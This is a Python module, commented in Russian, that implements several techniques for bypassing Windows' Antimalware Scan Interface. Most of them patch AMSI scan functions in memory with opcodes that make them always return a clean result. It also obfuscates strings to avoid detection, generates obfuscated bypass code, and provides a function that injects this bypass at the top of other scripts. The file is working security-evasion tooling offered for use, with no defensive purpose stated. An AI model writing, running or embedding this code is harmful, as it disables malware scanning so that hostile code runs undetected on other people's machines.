# -*- coding: utf-8 -*-
"""
AMSI Bypass Module - Обход Antimalware Scan Interface
Различные техники обхода AMSI для Windows
"""

import ctypes
import base64
import random
import string
from typing import Optional, List


class AMSIBypass:
    """
    Класс для обхода AMSI (Antimalware Scan Interface).
    Поддерживает множественные техники обхода.
    """

    def __init__(self):
        self.kernel32 = None
        self.amsi_dll = None
        self.bypassed = False

    def _generate_random_string(self, length: int = 10) -> str:
        """Генерирует случайную строку для обфускации."""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def technique_1_memory_patch(self) -> bool:
        """
        Техника 1: Патчинг amsi.dll в памяти
        Перезаписывает AmsiScanBuffer возвратом 0 (чистый результат)
        """
        try:
            # Загружаем amsi.dll
            amsi = ctypes.windll.LoadLibrary("amsi.dll")

            # Получаем адрес AmsiScanBuffer
            AmsiScanBuffer = amsi.AmsiScanBuffer

            # Патч: mov eax, 0; ret (возвращает всегда чистый результат)
            # Опкоды: B8 00 00 00 00 C3
            patch = b"\xB8\x00\x00\x00\x00\xC3"

            # Получаем адрес функции
            address = ctypes.cast(AmsiScanBuffer, ctypes.c_void_p).value

            # Изменяем защиту памяти на PAGE_EXECUTE_READWRITE
            old_protect = ctypes.c_ulong()
            kernel32 = ctypes.windll.kernel32
            kernel32.VirtualProtect(
                ctypes.c_void_p(address),
                len(patch),
                0x40,  # PAGE_EXECUTE_READWRITE
                ctypes.byref(old_protect)
            )

            # Применяем патч
            ctypes.memmove(ctypes.c_void_p(address), patch, len(patch))

            # Восстанавливаем защиту
            kernel32.VirtualProtect(
                ctypes.c_void_p(address),
                len(patch),
                old_protect.value,
                ctypes.byref(old_protect)
            )

            self.bypassed = True
            return True

        except Exception as e:
            return False

    def technique_2_context_patch(self) -> bool:
        """
        Техника 2: Патчинг AmsiContext
        Обнуляет контекст AMSI
        """
        try:
            amsi = ctypes.windll.LoadLibrary("amsi.dll")

            # Получаем адрес AmsiInitialize
            AmsiInitialize = amsi.AmsiInitialize

            # Патч для возврата ошибки инициализации
            # mov eax, 0x80070057 (E_INVALIDARG); ret
            patch = b"\xB8\x57\x00\x07\x80\xC3"

            address = ctypes.cast(AmsiInitialize, ctypes.c_void_p).value

            old_protect = ctypes.c_ulong()
            kernel32 = ctypes.windll.kernel32
            kernel32.VirtualProtect(
                ctypes.c_void_p(address),
                len(patch),
                0x40,
                ctypes.byref(old_protect)
            )

            ctypes.memmove(ctypes.c_void_p(address), patch, len(patch))

            kernel32.VirtualProtect(
                ctypes.c_void_p(address),
                len(patch),
                old_protect.value,
                ctypes.byref(old_protect)
            )

            self.bypassed = True
            return True

        except Exception as e:
            return False

    def technique_3_force_fail(self) -> bool:
        """
        Техника 3: Принудительный сбой AMSI
        Заставляет AMSI возвращать ошибку
        """
        try:
            # Обфусцированная строка для обхода детекта
            amsi_str = base64.b64decode("YW1zaS5kbGw=").decode()
            amsi = ctypes.windll.LoadLibrary(amsi_str)

            # Патчим AmsiOpenSession для возврата ошибки
            AmsiOpenSession = amsi.AmsiOpenSession

            # xor eax, eax; ret (возвращает 0)
            patch = b"\x31\xC0\xC3"

            address = ctypes.cast(AmsiOpenSession, ctypes.c_void_p).value

            old_protect = ctypes.c_ulong()
            kernel32 = ctypes.windll.kernel32
            kernel32.VirtualProtect(
                ctypes.c_void_p(address),
                len(patch),
                0x40,
                ctypes.byref(old_protect)
            )

            ctypes.memmove(ctypes.c_void_p(address), patch, len(patch))

            kernel32.VirtualProtect(
                ctypes.c_void_p(address),
                len(patch),
                old_protect.value,
                ctypes.byref(old_protect)
            )

            self.bypassed = True
            return True

        except Exception as e:
            return False

    def technique_4_dll_unload(self) -> bool:
        """
        Техника 4: Выгрузка amsi.dll
        Выгружает AMSI из памяти процесса
        """
        try:
            kernel32 = ctypes.windll.kernel32

            # Получаем хэндл amsi.dll
            amsi_handle = kernel32.GetModuleHandleW("amsi.dll")

            if amsi_handle:
                # Выгружаем DLL
                kernel32.FreeLibrary(amsi_handle)
                self.bypassed = True
                return True

            return False

        except Exception as e:
            return False

    def technique_5_registry_patch(self) -> bool:
        """
        Техника 5: Модификация реестра
        Отключает AMSI через реестр (требует прав администратора)
        """
        try:
            import winreg

            # Путь к ключу AMSI
            key_path = r"SOFTWARE\Microsoft\AMSI"

            # Открываем ключ
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                key_path,
                0,
                winreg.KEY_SET_VALUE
            )

            # Устанавливаем значение для отключения
            winreg.SetValueEx(key, "DisableAMSI", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)

            self.bypassed = True
            return True

        except Exception as e:
            return False

    def technique_6_reflection(self) -> bool:
        """
        Техника 6: Обход через рефлексию (для .NET/PowerShell)
        Модифицирует внутренние структуры AMSI
        """
        try:
            # Этот метод работает в PowerShell/C#
            # Для Python создаём эквивалент через ctypes

            amsi = ctypes.windll.LoadLibrary("amsi.dll")

            # Патчим AmsiScanString
            AmsiScanString = amsi.AmsiScanString

            # Патч для возврата AMSI_RESULT_CLEAN (0)
            patch = b"\x31\xC0\xC3"  # xor eax, eax; ret

            address = ctypes.cast(AmsiScanString, ctypes.c_void_p).value

            old_protect = ctypes.c_ulong()
            kernel32 = ctypes.windll.kernel32
            kernel32.VirtualProtect(
                ctypes.c_void_p(address),
                len(patch),
                0x40,
                ctypes.byref(old_protect)
            )

            ctypes.memmove(ctypes.c_void_p(address), patch, len(patch))

            kernel32.VirtualProtect(
                ctypes.c_void_p(address),
                len(patch),
                old_protect.value,
                ctypes.byref(old_protect)
            )

            self.bypassed = True
            return True

        except Exception as e:
            return False

    def bypass_all(self) -> bool:
        """
        Пробует все техники обхода по очереди.
        Возвращает True при первом успешном обходе.
        """
        techniques = [
            ("Memory Patch", self.technique_1_memory_patch),
            ("Context Patch", self.technique_2_context_patch),
            ("Force Fail", self.technique_3_force_fail),
            ("DLL Unload", self.technique_4_dll_unload),
            ("Reflection", self.technique_6_reflection),
        ]

        for name, technique in techniques:
            try:
                if technique():
                    return True
            except:
                continue

        return False

    def is_bypassed(self) -> bool:
        """Проверяет, был ли AMSI успешно обойдён."""
        return self.bypassed


def generate_bypass_code(obfuscate: bool = True) -> str:
    """
    Генерирует код для обхода AMSI.

    Args:
        obfuscate: Обфусцировать ли код

    Returns:
        str: Код обхода AMSI
    """
    if obfuscate:
        # Обфусцированная версия
        code = """
import ctypes, base64
def _x():
    try:
        a = ctypes.windll.LoadLibrary(base64.b64decode("YW1zaS5kbGw=").decode())
        b = a.AmsiScanBuffer
        c = b"\xB8\x00\x00\x00\x00\xC3"
        d = ctypes.cast(b, ctypes.c_void_p).value
        e = ctypes.c_ulong()
        f = ctypes.windll.kernel32
        f.VirtualProtect(ctypes.c_void_p(d), len(c), 0x40, ctypes.byref(e))
        ctypes.memmove(ctypes.c_void_p(d), c, len(c))
        f.VirtualProtect(ctypes.c_void_p(d), len(c), e.value, ctypes.byref(e))
        return True
    except:
        return False
_x()
"""
    else:
        # Простая версия
        code = """
import ctypes

def bypass_amsi():
    try:
        amsi = ctypes.windll.LoadLibrary("amsi.dll")
        AmsiScanBuffer = amsi.AmsiScanBuffer
        patch = b"\\xB8\\x00\\x00\\x00\\x00\\xC3"
        address = ctypes.cast(AmsiScanBuffer, ctypes.c_void_p).value
        old_protect = ctypes.c_ulong()
        kernel32 = ctypes.windll.kernel32
        kernel32.VirtualProtect(ctypes.c_void_p(address), len(patch), 0x40, ctypes.byref(old_protect))
        ctypes.memmove(ctypes.c_void_p(address), patch, len(patch))
        kernel32.VirtualProtect(ctypes.c_void_p(address), len(patch), old_protect.value, ctypes.byref(old_protect))
        return True
    except:
        return False

bypass_amsi()
"""

    return code


def inject_bypass_into_code(code: str) -> str:
    """
    Внедряет обход AMSI в начало кода.

    Args:
        code: Исходный код

    Returns:
        str: Код с внедрённым обходом AMSI
    """
    bypass_code = generate_bypass_code(obfuscate=True)
    return bypass_code + "\n" + code


# Пример использования
if __name__ == "__main__":
    print("AMSI Bypass Module - Тестирование")
    print("=" * 50)

    bypass = AMSIBypass()

    print("\nПопытка обхода AMSI...")
    if bypass.bypass_all():
        print("[+] AMSI успешно обойдён!")
    else:
        print("[-] Не удалось обойти AMSI")

    print(f"\nСтатус: {'Обойдён' if bypass.is_bypassed() else 'Активен'}")

    print("\n" + "=" * 50)
    print("Генерация кода обхода:")
    print(generate_bypass_code(obfuscate=False))
